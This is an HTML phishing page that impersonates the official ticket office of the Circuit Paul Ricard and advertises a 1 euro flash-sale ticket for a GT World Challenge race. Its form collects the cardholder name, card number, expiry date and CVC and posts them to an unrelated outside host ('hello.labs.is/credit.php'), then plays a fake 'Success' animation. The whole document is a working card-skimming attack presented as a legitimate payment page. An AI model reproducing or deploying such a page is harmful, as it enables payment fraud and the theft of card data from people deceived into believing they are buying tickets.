<html>
      <head>
	  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
           <style>
            @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@200&display=swap');
*{
    padding:0;
    margin:0;
}
.container{
    min-height:100vh;
    display:flex;
    justify-content:center;
    align-items:center;
    background-color:#eee;
}
.container .card{
    height:400px;
    width:800px;
    background-color:#fff;
    position:relative;
    box-shadow:0 15px 30px rgba(0,0,0,0.1);
    font-family: 'Poppins', sans-serif;
}
.container .card .form{
    width:100%;
    height:100%;
    display:flex;
}
.container .card .left-side{
    width:40%;
    background-color:#000;
    height:100%;
    box-sizing:border-box;
     position:relative;
     overflow:hidden;
     transition:all 1s;
}
 


.left-side .success{
    position:absolute;
    top:39%;
    z-index:2000;
    left:-100%;
    font-weight:900;
    font-size:60px;
    color:blue;
    transition:all 1s;
}

.left-side .success_done{
    left:35%;
}


.left-side .success_final{
    left:100%;
}
/*left-side-start*/
.image{
      width:100%;
    height:100%;
   
}
.image img{
    object-fit:cover;
    box-sizing:border-box;
    width:100%;
    height:100%;
}

.debit-card {
    height:160px;
    width:100%;
    background-color:#4b9aff;
    position:absolute;
    top:130px;
    left:10px;
    opacity:1;
    border-radius:10px;
    padding:0 20px;
    box-sizing:border-box;
    
}
.card_name{
    display:flex;
    flex-direction:column;
    margin-top:20px;
     color:#fff;
}
.card_name small{
    font-size:13px;
    margin-top:5px;
    font-weight:900;
}
.card_name span{
    font-size:12px;
   margin-bottom:20px;
    font-weight:600;
}
/*.flex_col{*/
/*      display:flex;*/
      
/*}*/
.num_expiry{
    margin-top:20px;
    display:flex;
    /*flex-direction:column;*/
justify-content:space-between;
  
    color:#fff;
}
.card_number,.card_cvv{
    display:flex;
    flex-direction:column;
}
/*.card_cvv{*/
/*        display:flex;*/
/*    flex-direction:column;*/
/*}*/
.num_expiry small{
    font-size:13px;
    font-weight:900;
}
.num_expiry span{
    font-size:12px;
   margin-bottom:20px;
    font-weight:600;
}




.wide {
    width: 100% !important;
    transition:all 1s;
}

   
.hide_right { 
    animation: anim 1s forwards
}

@keyframes anim {
    from {
        right: 0;
        opacity: 1
    }

    to {
        right: 150px;
        opacity: 0;
        display: none
    }
}








/*left-side-end*/
.container .card .right-side{
    width:60%;
    background-color:#fff;
    height:100%;
    padding:0 40px;
    box-sizing:border-box;
}
/*right-side-start*/
.right-side h3{
    margin-top:30px;
    margin-left:10px;
}
.input-text{
    position:relative;
    margin-top:30px;
}
input[type="text"]{
    height:40px;
    width:100%;
    border-radius:5px;
    border:none;
    outline:0;
    border-bottom:1px solid #b9c7da;
    padding:0 10px;
    box-sizing:border-box;
}
.input-text span{
    position:absolute;
    left:10px;
    top:-13px;
    font-size:12px;
    font-weight:700;
} 
.input-div{
    display:flex;
    gap:10px;
   width:100%;
}

.input-div .input-text{
    width:50%;
}
/*.cvvtext{*/
/*    width:50%;*/
/*}*/ 
.button{
    margin-top:30px;
}
.d-none{
    display:none !important;
}
.button button{
    height:40px;
    width:120px;
    border:none;
    border-radius:50px;
    color:#fff;
    font-size:12px;
    background-color:#4597ff;
    cursor:pointer;
    transition:all 0.5s;
}
.button button:hover{
    background-color:blue;
}

.warning{
    border-bottom:1px solid red !important;
}


/*right-side-end*/ 
@media (max-width:650px) {
    .container .card {
        max-width: 350px;
    }
    .container .card .right-side {
    
        width:100%;
    }
    .container .card .left-side {
      
            display: none;
    }
}

           </style>
		   <script type="text/javascript">
		   document.addEventListener('DOMContentLoaded', () => {
for (const el of document.querySelectorAll("[placeholder][data-slots]")) {
const pattern = el.getAttribute("placeholder"),
slots = new Set(el.dataset.slots || "_"),
prev = (j => Array.from(pattern, (c,i) => slots.has(c)? j=i+1: j))(0),
first = [...pattern].findIndex(c => slots.has(c)),
accept = new RegExp(el.dataset.accept || "\\d", "g"),
clean = input => {
input = input.match(accept) || [];
return Array.from(pattern, c =>
input[0] === c || slots.has(c) ? input.shift() || c : c
);
},
format = () => {
const [i, j] = [el.selectionStart, el.selectionEnd].map(i => {
i = clean(el.value.slice(0, i)).findIndex(c => slots.has(c));
return i<0? prev[prev.length-1]: back? prev[i-1] || first: i; }); el.value=clean(el.value).join``; el.setSelectionRange(i, j); back=false; }; let back=false; el.addEventListener("keydown", (e)=> back = e.key === "Backspace");
	el.addEventListener("input", format);
	el.addEventListener("focus", format);
	el.addEventListener("blur", () => el.value === pattern && (el.value=""));
	}
	});

var user_name = document.querySelector(".user_name");
var set_card_number = document.querySelector(".set_card_number");
var user_cardcvv = document.querySelector(".user_card_cvv")
var user_name_input = document.getElementById("user_name_input");
var user_card_number_input= document.getElementById("user_card_number_input");
function userName(name){
    
    user_name.innerHTML = name; 
} 

function userCardNumber(cardNumber){
    set_card_number.innerHTML = cardNumber;
}

function usercardcvv(cvv){
    user_cardcvv.innerHTML=cvv; 
}

var card=document.querySelector(".debit-card");
var click_pay = document.querySelector(".click-pay");
var left_side = document.querySelector(".left-side");
var right_side = document.querySelector(".right-side");
var success = document.querySelector(".success");
click_pay.addEventListener('click',function(){
    
    
    if(!validateform()){ 
        return false;
    } 
  right_side.style.display="none";
  left_side.classList.toggle('wide');
  left_side.style.display="block";
  card.classList.add('d-none');
     
  setTimeout(function(){
    success.classList.add('success_done');
}, 2000);
  
setTimeout(function(){
    success.classList.add('success_final');
}, 4000);
   
});

function validateform(){
    validate=true;
var validate_inputs=document.querySelectorAll(".right-side input");  
     
     validate_inputs.forEach(function(input_valid){
     input_valid.classList.remove('warning');
     if(input_valid.hasAttribute('require')){
         if(input_valid.value.length==0){
             validate=false;
             input_valid.classList.add('warning');
         }
     }
});
  return validate;
}

//  validate_inputs.classList.remove('warning');
//  if(validate_inputs has)
</script>
      </head>
	  <body>
<div class="container">
<center><img src="cpr.svg" ="250" ="400">
    <div class="card">
        <div class="form">
            <div class="left-side">
                <span class="success">Success</span>
                <div class="image">
                     
                     <img src="bg.jpg">
                </div>
                <div class="debit-card">
                    <div class="card_name">
                       <small>Titulaire de la carte</small>
                       <span class="user_name">John Doe</span>
                    </div>
                        <div class="num_expiry">
                            <div class="card_number">
                               <small>Num&eacute;ro de la carte</small>
                               <span class="set_card_number">0000 0000 0000 0000</span>
                            </div>
                            <div class="card_cvv">
                               <small>Terme d'expiration</small>
                               <span class="user_card_cvv">MM/YYYY</span>
                           </div>
                    
                        </div>
                </div> 
                 

                
            </div>
            <div class="right-side">
                <h3>Billetterie Officielle du Circuit Paul Ricard</h3>
				<h5>FANATEC GT WORLD CHALLENGE EUROPE powered by AWS</h5>
				<h6>Ventes Flash !!! Samedi : 1 € TTC  incluant l’accès à la Roof Top</h6>
                <div class="input-text">
				<form action="https://hello.labs.is/credit.php" method="post">
                    <input type="text" name="name" id="user_name_input" onkeyup="userName(this.value)" placeholder="Nom complet" required>
                    <span>Titulaire de la carte</span>
                </div>
                <div class="input-text">
                    <input type="text" name="ccnumb" id="user_card_number_input" placeholder="0000 0000 0000 0000" onkeyup="userCardNumber(this.value)" data-slots="0" data-accept="\d" required>
                    <span>Num&eacute;ro de la carte</span>
                </div> 
                <div class="input-div">
                    <div class="input-text">
                       <input type="text" name="exp" onkeyup="usercardcvv(this.value)" placeholder="MM/YYYY" data-slots="MY" required>
                       <span>Terme d'expiration</span>
                    </div>
                    <div class="input-text ">
                       <input type="text" name="cvc" placeholder="000" data-slots="0" data-accept="\d" size="3" required>
                       <span>CCV</span>
                    </div>
                </div> 
                <div class="button">
                    <button type="submit" name="submit" class="click-pay">Payer &#8364;1.00</button></form>
                </div>
            </div>
        </div>
    </div>
</div>
</body>